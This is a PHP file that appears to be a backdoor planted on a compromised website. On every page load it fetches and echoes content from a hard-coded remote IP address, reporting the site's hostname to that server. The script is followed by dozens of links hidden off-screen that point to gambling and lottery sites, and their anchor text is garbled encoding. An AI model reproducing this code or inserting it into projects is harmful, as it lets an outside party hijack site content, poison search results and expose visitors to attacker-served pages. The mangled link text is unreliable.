<?php
set_time_limit(0);
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://104.216.57.140/wx/index.php"; 
$host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
$userAgent = $_SERVER['HTTP_USER_AGENT']; 
$Content_mb=getHTTPPage($Remote_server."/index.php?host=".$host_name);
echo $Content_mb;
exit(); 
function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);
	$context = stream_context_create($opts);
	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
	}	
	return $html;
} 
?><div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.ghwl-ahzx.com/" title="ʱʱ��ƽ̨">ʱʱ��ƽ̨</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.gljet.com/" title="ʱʱ�ʼ���">ʱʱ�ʼ���</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.glyaqe.com/" title="pk10">pk10</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.goingpx.com/" title="����ʱʱ�ʿ���">����ʱʱ�ʿ���</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.gwwpzj.com/" title="ʱʱ���淨">ʱʱ���淨</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.gz-fa.com/" title="pk10qqȺ">pk10qqȺ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.gzhuojiac.com/" title="ʱʱ��qqȺ">ʱʱ��qqȺ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.greesale.com/" title="ʱʱ����վ">ʱʱ����վ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.haokan700.com/" title="����pk10qqȺ">����pk10qqȺ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.haybs.com/" title="�½�ʱʱ��">�½�ʱʱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hello-tc.com/" title="pk10����ֱ��">pk10����ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hnaidu.com/" title=",pk10����ֱ��">,pk10����ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hngygroup.com/" title="ʱʱ������ͼ">ʱʱ������ͼ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hnljjsyj.com/" title="���ɹ�11ѡ">���ɹ�11ѡ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.qzjcmy.com/" title="ʱʱ�ʽ���Ⱥ">ʱʱ�ʽ���Ⱥ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.sc-music.com/" title="����ʱʱ������ͼ">����ʱʱ������ͼ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.sdcspai.com/" title="pk10����Ⱥ">pk10����Ⱥ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.sdtymy688.com/" title="���ٷ�ͧ����">���ٷ�ͧ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.sf1003.com/" title="���ٷ�ͧ��Ʊ����">���ٷ�ͧ��Ʊ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.handangas.com/" title="���ٷ�ͧpk10����ֱ��">���ٷ�ͧpk10����ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.zhuxingdg.com/" title="���ٷ�ͧ����ֱ��">���ٷ�ͧ����ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.zsde2008.com/" title="���ٷ�ͧ�����ٷ���վ">���ٷ�ͧ�����ٷ���վ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hongdatz.com/" title="���ü��ٷ�ͧ������¼">���ü��ٷ�ͧ������¼</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.huasifang.com/" title="���ٷ�ͧ������¼">���ٷ�ͧ������¼</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hycfz.com/" title="���ٷ�ͧͶעƽ̨">���ٷ�ͧͶעƽ̨</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.i3putian.com/" title="���ٷ�ͧ������ַ">���ٷ�ͧ������ַ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.ic-zone.com/" title="���ٷ�ͧ��Ʊֱ��">���ٷ�ͧ��Ʊֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.jeuxfille1.com/" title="���˷�ͧ���ٿ���">���˷�ͧ���ٿ���</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.jianzhu99.com/" title="���ٷ�ͧͶע">���ٷ�ͧͶע</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.jipifu88.com/" title="���ٷ�ͧͶע��վ">���ٷ�ͧͶע��վ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.400800dh.com/" title="��ز�Ʊƽ̨">��ز�Ʊƽ̨</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.ltrkjs.com/" title="��ز�Ʊ��վ">��ز�Ʊ��վ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.wxznmg.com/" title="��ز�Ʊ��">��ز�Ʊ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hxqzry.com/" title="�󷢲�Ʊ��������">�󷢲�Ʊ��������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.allfromnz.com/" title="�󷢲�Ʊ����">�󷢲�Ʊ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.njbj8.com/" title="�󷢲�Ʊ����">�󷢲�Ʊ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.qianaishuo.com/" title="�󷢲�Ʊ��">�󷢲�Ʊ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.ychlyy.com/" title="�󷢲�Ʊ��¼��ַ">�󷢲�Ʊ��¼��ַ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.ptmled.com/" title="�󷢲�Ʊ����">�󷢲�Ʊ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hzyfqz.com/" title="�󷢲�Ʊ">�󷢲�Ʊ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.zhbxgcl.com/" title="���Ʋ�Ʊ��¼">���Ʋ�Ʊ��¼</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.gouyun66.com/" title="������������">������������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.zhiyouka.com/" title="������������">������������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.zsjshop.com/" title="����ʱʱ�ʿ���">����ʱʱ�ʿ���</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.fztianan.com/" title="����ʱʱ��">����ʱʱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.peixedu51.com/" title="���ٷ�ͧ">���ٷ�ͧ</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.lzcm888.com/" title="���ٷ�ͧ����">���ٷ�ͧ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.fzasaph.com/" title="��������pk10����ֱ��">��������pk10����ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.shqtzl.com/" title="����pk10����ֱ������">����pk10����ֱ������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.jsthkrvoLvo.com/" title="��������">��������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.difanni.cc/" title="��������">��������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.fengliemy.com/" title="��������">��������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.hzhangyuan.com/" title="ʢ��������������ֱ��">ʢ��������������ֱ��</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.guoxinghengye.com/" title="���ٷ�ͧ����">���ٷ�ͧ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.yzmiaow19.com/" title="���ٷ�ͧ����">���ٷ�ͧ����</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.shrongtongqz.com/" title="��������pkʰ��������">��������pkʰ��������</A>
<div style="position: absolute; top: -999px;left: -999px;">
<A href="http://www.haoli09.net/" title="���������������">���������������</A>